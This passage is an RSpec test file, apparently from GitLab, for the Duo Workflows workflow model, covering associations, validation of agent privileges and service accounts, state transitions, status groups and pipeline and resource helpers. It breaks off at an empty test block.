# frozen_string_literal: true

require 'spec_helper'

RSpec.describe Ai::DuoWorkflows::Workflow, feature_category: :duo_agent_platform do
  let(:user) { create(:user) }
  let(:another_user) { create(:user) }
  let(:workflow) { create(:duo_workflows_workflow) }
  let(:owned_workflow) { create(:duo_workflows_workflow, user: user) }
  let(:not_owned_workflow) { create(:duo_workflows_workflow, user: another_user) }

  describe 'associations' do
    it { is_expected.to have_many(:checkpoints).class_name('Ai::DuoWorkflows::Checkpoint') }
    it { is_expected.to have_many(:checkpoint_writes).class_name('Ai::DuoWorkflows::CheckpointWrite') }
    it { is_expected.to belong_to(:project).optional }
    it { is_expected.to belong_to(:namespace).optional }
    it { is_expected.to belong_to(:issue).optional }
    it { is_expected.to belong_to(:work_item).optional.with_foreign_key(:issue_id) }
    it { is_expected.to belong_to(:merge_request).optional }
    it { is_expected.to belong_to(:ai_catalog_item_version).optional }
    it { is_expected.to belong_to(:ai_catalog_item_version).class_name('Ai::Catalog::ItemVersion') }
    it { is_expected.to belong_to(:service_account).optional }
    it { is_expected.to belong_to(:service_account).class_name('User') }
    it { is_expected.to belong_to(:ai_catalog_item).optional }
    it { is_expected.to belong_to(:ai_catalog_item).class_name('Ai::Catalog::Item') }

    it 'validates vulnerability triggered workflow association' do
      is_expected.to have_many(:vulnerability_triggered_workflows).class_name('::Vulnerabilities::TriggeredWorkflow')
    end
  end

  describe 'service_account association' do
    let_it_be(:project) { create(:project) }
    let_it_be(:regular_user) { create(:user) }
    let_it_be(:service_account_user) { create(:user, :service_account) }

    describe 'validation' do
      context 'when service_account is nil' do
        it 'is valid' do
          workflow = build(:duo_workflows_workflow, project: project, service_account: nil)

          expect(workflow).to be_valid
        end
      end

      context 'when service_account is a service account user' do
        it 'is valid' do
          workflow = build(:duo_workflows_workflow, project: project, service_account: service_account_user)

          expect(workflow).to be_valid
        end
      end

      context 'when service_account is a regular user' do
        it 'is invalid' do
          workflow = build(:duo_workflows_workflow, project: project, service_account: regular_user)

          expect(workflow).not_to be_valid
          expect(workflow.errors[:service_account]).to include('must be a service account user')
        end
      end
    end

    describe 'on_delete behavior' do
      let(:service_account_user_1) { create(:user, :service_account) }

      it 'nullifies service_account_id when the service account user is deleted' do
        workflow = create(:duo_workflows_workflow, project: project, service_account: service_account_user_1)

        expect(workflow.service_account_id).to eq(service_account_user_1.id)

        service_account_user_1.destroy!
        workflow.reload

        expect(workflow.service_account_id).to be_nil
      end

      it 'does not delete the workflow when the service account user is deleted' do
        workflow = create(:duo_workflows_workflow, project: project, service_account: service_account_user_1)

        service_account_user_1.destroy!

        expect(described_class.find_by(id: workflow.id)).to be_present
      end
    end
  end

  describe 'ai_catalog_item association' do
    let_it_be(:organization) { create(:organization) }
    let_it_be(:project) { create(:project, organization: organization) }
    let_it_be(:catalog_item, freeze: false) { create(:ai_catalog_item, organization: organization) }
    let_it_be(:catalog_item_2, freeze: false) { create(:ai_catalog_item, organization: organization) }

    describe 'validation' do
      context 'when ai_catalog_item_id is nil' do
        it 'is valid' do
          workflow = build(:duo_workflows_workflow, project: project, ai_catalog_item: nil)

          expect(workflow).to be_valid
        end
      end

      context 'when ai_catalog_item_id is set without ai_catalog_item_version_id' do
        it 'is valid' do
          workflow = build(:duo_workflows_workflow, project: project,
            ai_catalog_item: catalog_item, ai_catalog_item_version: nil)

          expect(workflow).to be_valid
        end
      end

      context 'when both ai_catalog_item_id and ai_catalog_item_version_id are set and match' do
        it 'is valid' do
          version = create(:ai_catalog_item_version, item: catalog_item)
          workflow = build(:duo_workflows_workflow, project: project,
            ai_catalog_item: catalog_item, ai_catalog_item_version: version)

          expect(workflow).to be_valid
        end
      end

      context 'when ai_catalog_item_id and ai_catalog_item_version_id do not match' do
        it 'is invalid' do
          version = create(:ai_catalog_item_version, item: catalog_item_2)
          workflow = build(:duo_workflows_workflow, project: project,
            ai_catalog_item: catalog_item, ai_catalog_item_version: version)

          expect(workflow).not_to be_valid
          expect(workflow.errors[:ai_catalog_item_id]).to include('must match the catalog item of the version')
        end
      end

      context 'when ai_catalog_item_version_id references a non-existent record' do
        it 'is invalid' do
          workflow = build(:duo_workflows_workflow, project: project,
            ai_catalog_item: catalog_item, ai_catalog_item_version_id: non_existing_record_id)

          expect(workflow).not_to be_valid
          expect(workflow.errors[:ai_catalog_item_id]).to include('must match the catalog item of the version')
        end
      end

      context 'when ai_catalog_item_id is nil but ai_catalog_item_version_id is set' do
        it 'is valid' do
          version = create(:ai_catalog_item_version, item: catalog_item)
          workflow = build(:duo_workflows_workflow, project: project,
            ai_catalog_item: nil, ai_catalog_item_version: version)

          expect(workflow).to be_valid
        end
      end
    end

    describe 'on_delete behavior' do
      let(:catalog_item) { create(:ai_catalog_item, organization: organization) }

      it 'nullifies ai_catalog_item_id when the catalog item is deleted' do
        workflow = create(:duo_workflows_workflow, project: project, ai_catalog_item: catalog_item)

        expect(workflow.ai_catalog_item_id).to eq(catalog_item.id)

        catalog_item.destroy!
        workflow.reload

        expect(workflow.ai_catalog_item_id).to be_nil
      end

      it 'does not delete the workflow when the catalog item is deleted' do
        workflow = create(:duo_workflows_workflow, project: project, ai_catalog_item: catalog_item)

        catalog_item.destroy!

        expect(described_class.find_by(id: workflow.id)).to be_present
      end
    end
  end

  describe '.for_user_with_id!' do
    it 'finds the workflow for the given user and id' do
      expect(described_class.for_user_with_id!(user.id, owned_workflow.id)).to eq(owned_workflow)
    end

    it 'raises an error if the workflow is for a different user' do
      expect { described_class.for_user_with_id!(another_user, owned_workflow.id) }
        .to raise_error(ActiveRecord::RecordNotFound)
    end
  end

  describe '.for_user' do
    it 'finds the workflows for the given user' do
      expect(described_class.for_user(user)).to eq([owned_workflow])
    end
  end

  describe '.for_project' do
    let_it_be(:project) { create(:project) }
    let(:project_workflow) { create(:duo_workflows_workflow, project: project) }

    it 'finds the workflows for the given project' do
      expect(described_class.for_project(project)).to eq([project_workflow])
    end
  end

  describe '.with_environment' do
    let_it_be(:ide_workflow) { create(:duo_workflows_workflow, environment: :ide) }
    let_it_be(:web_workflow) { create(:duo_workflows_workflow, environment: :web) }
    let_it_be(:chat_partial_workflow) { create(:duo_workflows_workflow, environment: :chat_partial) }
    let_it_be(:chat_workflow) { create(:duo_workflows_workflow, environment: :chat) }
    let_it_be(:ambient_workflow) { create(:duo_workflows_workflow, environment: :ambient) }

    it 'finds the local workflows when environment is ide' do
      expect(described_class.with_environment(:ide)).to eq([ide_workflow])
    end

    it 'finds the remote workflows when environment is web' do
      expect(described_class.with_environment(:web)).to eq([web_workflow])
    end

    it 'finds the chat partial workflows when environment is chat_partial' do
      expect(described_class.with_environment(:chat_partial)).to eq([chat_partial_workflow])
    end

    it 'finds the chat workflows when environment is chat' do
      expect(described_class.with_environment(:chat)).to eq([chat_workflow])
    end

    it 'finds the ambient workflows when environment is ambient' do
      expect(described_class.with_environment(:ambient)).to eq([ambient_workflow])
    end
  end

  describe '.from_pipeline' do
    let_it_be(:ide_workflow) do
      create(:duo_workflows_workflow, environment: :ide, workflow_definition: :software_development)
    end

    let_it_be(:web_workflow) do
      create(:duo_workflows_workflow, environment: :web, workflow_definition: :chat)
    end

    let_it_be(:pipeline_workflow) do
      create(:duo_workflows_workflow, environment: :web, workflow_definition: :convert_to_gitlab_ci)
    end

    it 'finds the local workflows when environment is ide' do
      expect(described_class.from_pipeline).to eq([pipeline_workflow])
    end

    context 'when workflow_definition is a foundational chat agent' do
      using RSpec::Parameterized::TableSyntax

      where(:definition) do
        ::Ai::FoundationalChatAgent.workflow_definitions.map { |d| [d] }
      end

      with_them do
        it 'excludes foundational chat agent workflows from pipeline results' do
          foundational_chat_agent_workflow = create(:duo_workflows_workflow, environment: :web,
            workflow_definition: definition)

          expect(described_class.from_pipeline).not_to include(foundational_chat_agent_workflow)
        end
      end
    end
  end

  describe '.order_by_status' do
    subject(:workflows) { described_class.order_by_status(direction) }

    let_it_be(:created_workflow) { create(:duo_workflows_workflow, :created) }
    let_it_be(:running_workflow) { create(:duo_workflows_workflow, :running) }
    let_it_be(:failed_workflow) { create(:duo_workflows_workflow, :failed) }

    context 'when direction is asc' do
      let(:direction) { :asc }

      it 'sorts workflows by their status ascending' do
        expect(workflows.map(&:human_status_name)).to eq(%w[created running failed])
      end
    end

    context 'when direction is desc' do
      let(:direction) { :desc }

      it 'sorts workflows by their status descending' do
        expect(workflows.map(&:human_status_name)).to eq(%w[failed running created])
      end
    end
  end

  describe '.ordered_statuses' do
    it 'returns the ordered statuses based on the defined groups' do
      expect(described_class.ordered_statuses).to eq(
        [0, 1, 2, 6, 7, 8, 3, 4, 5]
      )
    end
  end

  describe '.in_status_group' do
    context 'when the status group exists' do
      it 'returns the workflows that match the status group' do
        expect(described_class.in_status_group(:active)).to include(workflow)
      end
    end

    context 'when the status group does not exist' do
      it 'returns an empty relation' do
        expect(described_class.in_status_group(:nonexistent)).to be_empty
      end
    end
  end

  describe '.updated_after' do
    let_it_be(:recent_workflow) { create(:duo_workflows_workflow, updated_at: 10.days.ago) }
    let_it_be(:very_recent_workflow) { create(:duo_workflows_workflow, updated_at: 1.day.ago) }

    before_all do
      create(:duo_workflows_workflow, updated_at: 40.days.ago)
    end

    it 'returns workflows updated after the specified time' do
      expect(described_class.updated_after(30.days.ago)).to contain_exactly(recent_workflow, very_recent_workflow)
    end
  end

  describe 'validations' do
    it { is_expected.to validate_presence_of(:status) }
    it { is_expected.to validate_length_of(:goal).is_at_most(16_384) }
    it { is_expected.to validate_length_of(:image).is_at_most(2048) }
    it { is_expected.to validate_length_of(:title).is_at_most(described_class::TITLE_MAX_LENGTH) }

    describe '#only_known_agent_privileges' do
      it 'is valid with a valid privilege' do
        workflow = described_class.new(
          agent_privileges: [
            Ai::DuoWorkflows::Workflow::AgentPrivileges::READ_WRITE_FILES
          ],
          pre_approved_agent_privileges: [],
          environment: :ide
        )
        expect(workflow).to be_valid
      end

      it 'is valid with the START_FLOWS privilege' do
        workflow = described_class.new(
          agent_privileges: [
            Ai::DuoWorkflows::Workflow::AgentPrivileges::START_FLOWS
          ],
          pre_approved_agent_privileges: [],
          environment: :ide
        )
        expect(workflow).to be_valid
      end

      it 'is invalid with an invalid privilege' do
        workflow = described_class.new(agent_privileges: [999], environment: :ide)
        expect(workflow).not_to be_valid
        expect(workflow.errors[:agent_privileges]).to include("contains an invalid value 999")
      end
    end

    describe '.with_workflow_definition' do
      let!(:chat_workflow) { create(:duo_workflows_workflow, workflow_definition: 'chat') }
      let!(:dev_workflow) { create(:duo_workflows_workflow, workflow_definition: 'software_development') }

      it 'finds workflows with the given workflow definition' do
        expect(described_class.with_workflow_definition('chat')).to contain_exactly(chat_workflow)
        expect(described_class.with_workflow_definition('software_development')).to contain_exactly(dev_workflow)
      end

      it 'returns empty when no workflows match the definition' do
        expect(described_class.with_workflow_definition('nonexistent')).to be_empty
      end
    end

    describe '.without_workflow_definition' do
      let!(:chat_workflow) { create(:duo_workflows_workflow, workflow_definition: 'chat') }
      let!(:dev_workflow) { create(:duo_workflows_workflow, workflow_definition: 'software_development') }
      let!(:ci_workflow) { create(:duo_workflows_workflow, workflow_definition: 'convert_to_gitlab_ci') }

      it 'excludes workflows with the given workflow definition' do
        expect(described_class.without_workflow_definition('chat')).to contain_exactly(dev_workflow, ci_workflow)
        expect(described_class.without_workflow_definition('software_development'))
          .to contain_exactly(chat_workflow, ci_workflow)
      end

      it 'returns all workflows when excluding nonexistent definition' do
        expect(described_class.without_workflow_definition('nonexistent'))
          .to contain_exactly(chat_workflow, dev_workflow, ci_workflow)
      end
    end

    describe '#only_known_pre_approved_agent_priviliges' do
      let(:agent_privileges) { [] }
      let(:pre_approved_agent_privileges) { [] }

      subject(:workflow) do
        described_class.new(
          agent_privileges: agent_privileges,
          pre_approved_agent_privileges: pre_approved_agent_privileges,
          environment: :ide
        )
      end

      it { is_expected.to be_valid }

      context 'with valid privilege' do
        let(:agent_privileges) { [Ai::DuoWorkflows::Workflow::AgentPrivileges::READ_WRITE_FILES] }
        let(:pre_approved_agent_privileges) { [Ai::DuoWorkflows::Workflow::AgentPrivileges::READ_WRITE_FILES] }

        it { is_expected.to be_valid }
      end

      context 'with invalid privilege' do
        let(:pre_approved_agent_privileges) { [999] }

        it 'is invalid' do
          is_expected.to be_invalid
          expect(workflow.errors[:pre_approved_agent_privileges]).to include("contains an invalid value 999")
        end
      end
    end

    describe '#pre_approved_privileges_included_in_agent_privileges' do
      using RSpec::Parameterized::TableSyntax
      let(:default_privileges) { Ai::DuoWorkflows::Workflow::AgentPrivileges::DEFAULT_PRIVILEGES }
      let(:rw_files) { Ai::DuoWorkflows::Workflow::AgentPrivileges::READ_WRITE_FILES }
      let(:ro_gitlab) { Ai::DuoWorkflows::Workflow::AgentPrivileges::READ_ONLY_GITLAB }

      where(:pre_approved, :agent_privileges, :valid) do
        nil                               | nil                               | true
        []                                | []                                | true
        nil                               | []                                | false
        []                                | nil                               | true
        ref(:default_privileges)          | nil                               | true
        [ref(:ro_gitlab)]                 | [ref(:ro_gitlab)]                 | true
        [ref(:ro_gitlab)]                 | [ref(:rw_files), ref(:ro_gitlab)] | true
        [ref(:rw_files), ref(:ro_gitlab)] | [ref(:rw_files)]                  | false
      end

      with_them do
        specify do
          workflow = described_class
                       .new(
                         agent_privileges: agent_privileges,
                         pre_approved_agent_privileges: pre_approved,
                         environment: :ide
                       )

          expect(workflow.valid?).to eq(valid)
        end
      end
    end
  end

  describe '#set_title_from_workflow_definition' do
    context 'when title is not set' do
      it 'sets title to workflow_definition on create' do
        workflow = create(:duo_workflows_workflow, title: nil)

        expect(workflow.title).to eq('software_development')
      end

      it 'truncates workflow_definition to TITLE_MAX_LENGTH' do
        long_definition = 'a' * (described_class::TITLE_MAX_LENGTH + 10)
        workflow = create(:duo_workflows_workflow, title: nil, workflow_definition: long_definition)

        expect(workflow.title.length).to eq(described_class::TITLE_MAX_LENGTH)
      end
    end

    context 'when title is already set' do
      it 'does not overwrite the existing title' do
        workflow = create(:duo_workflows_workflow, title: 'My custom title')

        expect(workflow.title).to eq('My custom title')
      end
    end
  end

  describe '#agent_privileges' do
    it 'returns the privileges that are set' do
      workflow = described_class.new(
        agent_privileges: [
          Ai::DuoWorkflows::Workflow::AgentPrivileges::READ_WRITE_FILES,
          Ai::DuoWorkflows::Workflow::AgentPrivileges::READ_WRITE_GITLAB
        ],
        pre_approved_agent_privileges: [],
        environment: :ide
      )

      # Validation triggers setting the default
      expect(workflow).to be_valid

      expect(workflow.agent_privileges).to match_array([
        described_class::AgentPrivileges::READ_WRITE_FILES,
        described_class::AgentPrivileges::READ_WRITE_GITLAB
      ])
    end

    it 'replaces with DEFAULT_PRIVILEGES when set to nil' do
      workflow = described_class.new(agent_privileges: nil, environment: :ide)

      # Validation triggers setting the default
      expect(workflow).to be_valid

      expect(workflow.agent_privileges).to match_array([
        described_class::AgentPrivileges::READ_WRITE_FILES,
        described_class::AgentPrivileges::READ_ONLY_GITLAB,
        described_class::AgentPrivileges::READ_WRITE_GITLAB,
        described_class::AgentPrivileges::RUN_COMMANDS,
        described_class::AgentPrivileges::USE_GIT,
        described_class::AgentPrivileges::RUN_MCP_TOOLS
      ])
    end

    it 'replaces with database defaults when not set' do
      workflow = described_class.new(environment: :ide)

      # Validation triggers setting the default
      expect(workflow).to be_valid

      expect(workflow.agent_privileges).to match_array([
        described_class::AgentPrivileges::READ_WRITE_FILES,
        described_class::AgentPrivileges::READ_ONLY_GITLAB
      ])
    end
  end

  describe 'state transitions' do
    using RSpec::Parameterized::TableSyntax
    where(:status, :can_start, :can_pause, :can_resume, :can_finish, :can_drop, :can_stop, :can_retry,
      :can_require_input, :can_require_plan_approval, :can_require_tool_call_approval) do
      0 | true  | false | false | false | true  | true  | false | false | false | false
      1 | false | true  | false | true  | true  | true  | true  | true  | true  | true
      2 | false | false | true  | false | true  | true  | false | false | false | false
      3 | false | false | false | false | false | false | false | false | false | false
      4 | false | false | false | false | false | false | true  | false | false | false
      5 | false | false | false | false | false | false | true  | false | false | false
      6 | false | false | true  | false | true  | true  | false | false | false | false
      7 | false | false | true  | false | true  | true  | false | false | false | false
      8 | false | false | true  | false | true  | true  | false | false | false | false
    end

    with_them do
      it 'adheres to state machine rules', :aggregate_failures do
        owned_workflow.status = status

        expect(owned_workflow.can_start?).to eq(can_start)
        expect(owned_workflow.can_pause?).to eq(can_pause)
        expect(owned_workflow.can_resume?).to eq(can_resume)
        expect(owned_workflow.can_finish?).to eq(can_finish)
        expect(owned_workflow.can_drop?).to eq(can_drop)
        expect(owned_workflow.can_stop?).to eq(can_stop)
        expect(owned_workflow.can_retry?).to eq(can_retry)
        expect(owned_workflow.can_require_input?).to eq(can_require_input)
        expect(owned_workflow.can_require_plan_approval?).to eq(can_require_plan_approval)
        expect(owned_workflow.can_require_tool_call_approval?).to eq(can_require_tool_call_approval)
      end
    end
  end

  describe 'publishing WorkflowStartedEvent on start' do
    context 'with a messaging_callback_context' do
      let(:workflow) do
        create(:duo_workflows_workflow, messaging_callback_context: { 'adapter' => 'slack' })
      end

      it 'publishes the event on the initial start transition' do
        expect { workflow.start! }.to publish_event(::Ai::DuoWorkflows::WorkflowStartedEvent)
          .with(workflow_id: workflow.id)
      end

      it 'does not publish on resume (only on initial start)' do
        workflow.start!
        workflow.pause!

        expect { workflow.resume! }.not_to publish_event(::Ai::DuoWorkflows::WorkflowStartedEvent)
      end
    end

    context 'without a messaging_callback_context' do
      let(:workflow) { create(:duo_workflows_workflow, messaging_callback_context: nil) }

      it 'does not publish the event' do
        expect { workflow.start! }.not_to publish_event(::Ai::DuoWorkflows::WorkflowStartedEvent)
      end
    end
  end

  it 'has_many workloads' do
    workload1 = create(:ci_workload)
    workload2 = create(:ci_workload)
    create(:duo_workflows_workload, workflow: workflow, workload: workload1)
    create(:duo_workflows_workload, workflow: workflow, workload: workload2)

    expect(workflow.reload.workloads).to contain_exactly(workload1, workload2)
  end

  describe '#chat?' do
    subject { workflow.chat? }

    context 'when workflow_definition is chat' do
      let(:workflow) { build(:duo_workflows_workflow, workflow_definition: 'chat') }

      it { is_expected.to be_truthy }
    end

    context 'when workflow_definition is another foundational chat agent' do
      let(:workflow) { build(:duo_workflows_workflow, workflow_definition: 'duo_planner/v1') }

      it { is_expected.to be_truthy }
    end

    context 'when workflow_definition is different from chat' do
      let(:workflow) { build(:duo_workflows_workflow, workflow_definition: 'awesome workflow') }

      it { is_expected.to be_falsey }
    end
  end

  describe '#last_workload_pipeline_status' do
    context 'when workflow has no workloads' do
      it 'returns nil' do
        expect(workflow.last_workload_pipeline_status).to be_nil
      end
    end

    context 'when last workload has a pipeline' do
      before do
        pipeline = create(:ci_pipeline, :success, project: workflow.project)
        workload = create(:ci_workload, pipeline: pipeline, project: workflow.project)
        workflow.workflows_workloads.create!(workload: workload, project: workflow.project)
      end

      it 'returns the pipeline status as a symbol' do
        expect(workflow.last_workload_pipeline_status).to eq(:success)
      end
    end
  end

  describe '#last_executor_logs_url' do
    context 'when workloads exist' do
      before do
        workload = create(:ci_workload, project: workflow.project)
        workflow.workflows_workloads.create!(workload: workload, project: workflow.project)
        allow(workflow.last_workload).to receive(:logs_url).and_return('url_to_logs')
      end

      it 'returns the URL to the last workload pipeline' do
        expect(workflow.last_executor_logs_url).to eq('url_to_logs')
      end
    end

    context 'when no workloads exist' do
      it 'returns nil' do
        expect(workflow.last_executor_logs_url).to be_nil
      end
    end
  end

  describe '#all_executor_logs_urls' do
    subject(:urls) { workflow.all_executor_logs_urls }

    def new_workload(created_at: Time.current)
      create(:ci_workload, project: workflow.project, created_at: created_at)
    end

    def attach_workload(workload, with_logs_url: true)
      workflow.workflows_workloads.create!(workload: workload, project: workflow.project)
      create(:ci_build, pipeline: workload.pipeline, project: workflow.project) if with_logs_url
    end

    context 'when multiple workloads exist' do
      let(:older_workload) { new_workload(created_at: 2.days.ago) }
      let(:newer_workload) { new_workload(created_at: 1.day.ago) }

      before do
        attach_workload(older_workload)
        attach_workload(newer_workload)
      end

      it 'returns all logs URLs ordered by most recent workload first' do
        expect(urls).to eq([newer_workload.logs_url, older_workload.logs_url])
      end
    end

    context 'when a workload has no logs_url' do
      let(:workload_with_logs_url) { new_workload }
      let(:workload_without_logs_url) { new_workload }

      before do
        attach_workload(workload_with_logs_url)
        attach_workload(workload_without_logs_url, with_logs_url: false)
      end

      it 'excludes nil URLs' do
        expect(urls).to eq([workload_with_logs_url.logs_url])
      end
    end

    context 'when no workloads exist' do
      it 'returns an empty array' do
        expect(urls).to eq([])
      end
    end
  end

  describe '#project_level?' do
    subject { workflow.project_level? }

    context 'when project is present' do
      let(:workflow) { create(:duo_workflows_workflow, project: create(:project)) }

      it { is_expected.to be(true) }
    end

    context 'when namespace is present' do
      let(:workflow) { build(:duo_workflows_workflow, namespace: create(:group)) }

      it { is_expected.to be(false) }
    end
  end

  describe '#namespace_level?' do
    subject { workflow.namespace_level? }

    context 'when project is present' do
      let(:workflow) { create(:duo_workflows_workflow, project: create(:project)) }

      it { is_expected.to be(false) }
    end

    context 'when namespace is present' do
      let(:workflow) { build(:duo_workflows_workflow, namespace: create(:group)) }

      it { is_expected.to be(true) }
    end
  end

  describe '#mcp_enabled?' do
    subject { workflow.mcp_enabled? }

    let_it_be(:ai_settings, freeze: false) { create(:namespace_ai_settings, duo_workflow_mcp_enabled: true) }

    context 'when project is present' do
      let(:project) { create(:project) }
      let(:workflow) { create(:duo_workflows_workflow, project: project) }

      it { is_expected.to be(false) }

      context 'when duo_workflow_mcp_enabled is enabled on root ancestor' do
        let(:group) { create(:group, ai_settings: ai_settings) }
        let(:project) { create(:project, group: group) }

        it { is_expected.to be(true) }
      end
    end

    context 'when namespace is present' do
      let(:group) { create(:group) }
      let(:workflow) { create(:duo_workflows_workflow, namespace: group) }

      it { is_expected.to be(false) }

      context 'when duo_workflow_mcp_enabled is enabled on root ancestor' do
        let(:group) { create(:group, ai_settings: ai_settings) }

        it { is_expected.to be(true) }
      end
    end
  end

  describe '#archived?' do
    subject { workflow.archived? }

    context 'when created more than CHECKPOINT_RETENTION_DAYS ago' do
      let(:workflow) do
        build(:duo_workflows_workflow, created_at: (Ai::DuoWorkflows::CHECKPOINT_RETENTION_DAYS + 1).days.ago)
      end

      it { is_expected.to be(true) }
    end

    context 'when created exactly CHECKPOINT_RETENTION_DAYS ago' do
      let(:workflow) do
        build(:duo_workflows_workflow, created_at: Ai::DuoWorkflows::CHECKPOINT_RETENTION_DAYS.days.ago)
      end

      it { is_expected.to be(true) }
    end

    context 'when created less than CHECKPOINT_RETENTION_DAYS ago' do
      let(:workflow) do
        build(:duo_workflows_workflow, created_at: (Ai::DuoWorkflows::CHECKPOINT_RETENTION_DAYS - 1).days.ago)
      end

      it { is_expected.to be(false) }
    end

    context 'when created recently' do
      let(:workflow) { build(:duo_workflows_workflow, created_at: 1.day.ago) }

      it { is_expected.to be(false) }
    end
  end

  describe '#stalled?' do
    subject { workflow.stalled? }

    context 'when status is created and has no checkpoints' do
      let(:workflow) { create(:duo_workflows_workflow) }

      it { is_expected.to be(false) }
    end

    context 'when status is not created and has no checkpoints' do
      let(:workflow) { create(:duo_workflows_workflow) }

      before do
        workflow.start! # transitions to :running
      end

      it { is_expected.to be(true) }
    end

    context 'when status is not created and has checkpoints' do
      let(:workflow) { create(:duo_workflows_workflow) }

      before do
        workflow.start! # transitions to :running
        create(:duo_workflows_checkpoint, workflow: workflow)
      end

      it { is_expected.to be(false) }
    end

    context 'when status is finished and has no checkpoints' do
      let(:workflow) { create(:duo_workflows_workflow) }

      before do
        workflow.start! # transitions to :running
        workflow.finish! # transitions to :finished
      end

      it { is_expected.to be(true) }
    end

    context 'when status is failed and has checkpoints' do
      let(:workflow) { create(:duo_workflows_workflow) }

      before do
        workflow.drop! # transitions to :failed
        create(:duo_workflows_checkpoint, workflow: workflow)
      end

      it { is_expected.to be(false) }
    end
  end

  describe '#status_group' do
    using RSpec::Parameterized::TableSyntax

    let(:states) { described_class.state_machine(:status).states }

    where(:group, :status) do
      :active          | :created
      :active          | :running
      :paused          | :paused
      :awaiting_input  | :input_required
      :awaiting_input  | :plan_approval_required
      :awaiting_input  | :tool_call_approval_required
      :completed       | :finished
      :failed          | :failed
      :canceled        | :stopped
    end

    with_them do
      it 'returns the correct status group' do
        owned_workflow.status = states[status].value

        expect(owned_workflow.status_group).to eq(group)
      end
    end
  end

  describe '#noteable' do
    let_it_be(:project) { create(:project) }

    context 'when workflow has an issue' do
      let_it_be(:issue) { create(:issue, project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, issue: issue) }

      it 'returns the issue' do
        expect(workflow.noteable).to eq(issue)
      end
    end

    context 'when workflow has a merge request' do
      let_it_be(:merge_request) { create(:merge_request, source_project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, merge_request: merge_request) }

      it 'returns the merge request' do
        expect(workflow.noteable).to eq(merge_request)
      end
    end

    context 'when workflow has both issue and merge request' do
      let_it_be(:issue) { create(:issue, project: project) }
      let_it_be(:merge_request) { create(:merge_request, source_project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, issue: issue, merge_request: merge_request) }

      it 'returns the issue (priority)' do
        expect(workflow.noteable).to eq(issue)
      end
    end

    context 'when workflow has no noteable' do
      let(:workflow) { build(:duo_workflows_workflow, project: project) }

      it 'returns nil' do
        expect(workflow.noteable).to be_nil
      end
    end

    context 'when noteable does not respond to :project' do
      let_it_be(:issue) { create(:issue, project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, issue: issue) }

      it 'returns nil' do
        allow(issue).to receive(:respond_to?).and_call_original
        allow(issue).to receive(:respond_to?).with(:project).and_return(false)

        expect(workflow.noteable).to be_nil
      end
    end

    context 'when noteable has a blank project' do
      let_it_be(:issue) { create(:issue, project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, issue: issue) }

      it 'returns nil' do
        allow(issue).to receive(:project).and_return(nil)

        expect(workflow.noteable).to be_nil
      end
    end
  end

  describe '#from_pipeline?' do
    subject(:from_pipeline) { workflow.from_pipeline? }

    let(:workflow) { build(:duo_workflows_workflow, environment: environment) }

    context 'when environment is ide' do
      let(:environment) { 'ide' }

      it { is_expected.to be(false) }
    end

    context 'when environment is web' do
      let(:environment) { 'web' }

      it { is_expected.to be(true) }
    end

    context 'when environment is chat_partial' do
      let(:environment) { 'chat_partial' }

      it { is_expected.to be(false) }
    end

    context 'when environment is chat' do
      let(:environment) { 'chat' }

      it { is_expected.to be(false) }
    end

    context 'when environment is ambient' do
      let(:environment) { 'ambient' }

      it { is_expected.to be(true) }
    end
  end

  describe '#associated_pipelines' do
    let(:project) { create(:project) }
    let(:workflow) { create(:duo_workflows_workflow, project: project) }
    let(:pipeline1) { create(:ci_pipeline, project: project) }
    let(:pipeline2) { create(:ci_pipeline, project: project) }
    let(:pipeline3) { create(:ci_pipeline, project: project) }
    let(:workload1) { create(:ci_workload, pipeline: pipeline1, project: project) }
    let(:workload2) { create(:ci_workload, pipeline: pipeline2, project: project) }
    let(:workload3) { create(:ci_workload, pipeline: pipeline3, project: project) }

    it 'returns unique pipelines from workloads' do
      workflow.workflows_workloads.create!(workload: workload1, project: project)
      workflow.workflows_workloads.create!(workload: workload2, project: project)
      workflow.workflows_workloads.create!(workload: workload3, project: project)

      # Test duplicate
      workflow.workflows_workloads.create!(workload: workload1, project: project)

      expect(workflow.associated_pipelines).to contain_exactly(pipeline1, pipeline2, pipeline3)
    end

    it 'returns empty array when no workloads' do
      expect(workflow.associated_pipelines).to be_empty
    end
  end

  describe '#resource' do
    let(:project) { build(:project) }

    context 'when workflow has an issue' do
      let(:issue) { build(:issue, project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, issue: issue) }

      it 'returns the issue' do
        expect(workflow.resource).to eq(issue)
      end
    end

    context 'when workflow has a merge_request' do
      let(:merge_request) { build(:merge_request, source_project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, merge_request: merge_request) }

      it 'returns the merge_request' do
        expect(workflow.resource).to eq(merge_request)
      end
    end

    context 'when workflow has neither' do
      let(:workflow) { build(:duo_workflows_workflow, project: project) }

      it 'returns nil' do
        expect(workflow.resource).to be_nil
      end
    end
  end

  describe '#resource_iid' do
    let(:project) { build(:project) }

    context 'when workflow has an issue' do
      let(:issue) { build(:issue, project: project, iid: 42) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, issue: issue) }

      it 'returns the issue iid' do
        expect(workflow.resource_iid).to eq(42)
      end
    end

    context 'when workflow has a merge_request' do
      let(:merge_request) { build(:merge_request, source_project: project, iid: 7) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, merge_request: merge_request) }

      it 'returns the merge request iid' do
        expect(workflow.resource_iid).to eq(7)
      end
    end

    context 'when workflow has no resource' do
      let(:workflow) { build(:duo_workflows_workflow, project: project) }

      it 'returns nil' do
        expect(workflow.resource_iid).to be_nil
      end
    end
  end

  describe '#resource_web_url' do
    let(:project) { build(:project) }

    context 'when workflow has an issue' do
      let(:issue) { build(:issue, project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, issue: issue) }

      it 'returns the issue url' do
        expect(workflow.resource_web_url).to eq(Gitlab::UrlBuilder.build(issue))
      end
    end

    context 'when workflow has a merge request' do
      let(:merge_request) { build_stubbed(:merge_request, source_project: project) }
      let(:workflow) { build(:duo_workflows_workflow, project: project, merge_request: merge_request) }

      it 'returns the merge request url' do
        expect(workflow.resource_web_url).to eq(Gitlab::UrlBuilder.build(merge_request))
      end
    end

    context 'when workflow has no resource' do
      let(:workflow) { build(:duo_workflows_workflow, project: project) }

      it 'returns nil' do
        expect(workflow.resource_web_url).to be_nil
      end
    end
  end

  describe '#to_ability_name' do
